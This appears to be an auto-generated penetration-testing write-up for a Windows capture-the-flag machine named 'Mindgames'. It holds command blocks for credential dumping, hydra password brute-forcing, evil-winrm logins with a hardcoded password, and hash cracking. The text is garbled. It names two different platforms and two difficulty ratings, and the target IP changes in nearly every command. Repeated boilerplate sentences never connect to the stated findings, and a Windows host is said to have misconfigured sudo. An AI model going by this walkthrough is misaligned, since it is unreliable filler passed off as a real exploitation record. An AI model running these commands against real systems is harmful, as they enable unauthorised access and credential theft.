---
TitleSEO: "VulnHub — Mindgames (Medium Windows) | ZureFX"
TitlePost: "VulnHub — Mindgames (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Mindgames. Broken Access Control and Unquoted Service Path to achieve medium compromise on Windows."
Keywords: "easy, windows, hackthebox"
URL: "https://zurefx.github.io/writeups/htb-mindgames-178.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-mindgames-178/"
Date: "2025-08-04"
Tags: "Easy, Windows, HackTheBox"
Section: "writeups"
Lang: "en"
main_img: "htb-mindgames-178"
Permalink: "/writeups/htb-mindgames-178.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Mindgames** is rated **Medium** on VulnHub. It runs **Windows** and the IP address during this analysis was `10.64.202.215`.

### Objectives

Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.103.47.86
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.70.195.203/FUZZ
```

The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files.

```bash
feroxbuster -h
crackmapexec smb 10.126.151.20 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.113.153.178 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code.

### SMB Enumeration

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
gobuster dir -u http://10.63.171.7/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

## Exploitation

### Vulnerability Identification

Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality.

Key finding: **Unquoted Service Path**.

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

### Initial Access

Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

```bash
evil-winrm -i 10.31.25.152 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.85.8.35
feroxbuster -h
evil-winrm -i 10.83.61.69 -u administrator -p 'P@ssw0rd!'
```

The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code.

## Privilege Escalation

### Enumeration

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.55.114.82/FUZZ
evil-winrm -i 10.125.157.149 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.16.208.214
```

### Exploitation

The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

Unconstrained delegation was enabled on the compromised machine. Group Policy Preferences contained encrypted but recoverable credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Unconstrained delegation was enabled on the compromised machine. The application stored sensitive credentials in an unencrypted configuration file.

## Summary

### Tools Used

- `GetUserSPNs`
- `bloodhound`
- `burpsuite`
- `hydra`

### Key Takeaways

- Broken Access Control
- Unquoted Service Path
